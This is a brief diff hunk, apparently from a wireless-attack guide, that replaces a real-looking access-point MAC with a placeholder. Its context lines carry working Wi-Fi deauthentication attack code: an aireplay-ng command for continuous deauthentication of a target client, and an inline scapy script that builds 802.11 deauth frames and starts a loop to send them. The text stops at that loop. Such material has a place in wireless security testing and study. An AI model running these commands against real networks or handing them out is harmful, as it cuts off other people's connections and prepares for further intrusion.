@@ -179,7 +179,7 @@ sudo aireplay-ng -D --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
 sudo python3 -c "
 from scapy.all import *
 import time
-BSSID='8a:c2:27:a1:19:cc'
+BSSID='AA:BB:CC:DD:EE:01'
 CLIENT='96:2f:ef:12:f8:f6'
 p = RadioTap()/Dot11(type=0,subtype=12,addr1=CLIENT,addr2=BSSID,addr3=BSSID)/Dot11Deauth(reason=7)
 for _ in range(30):
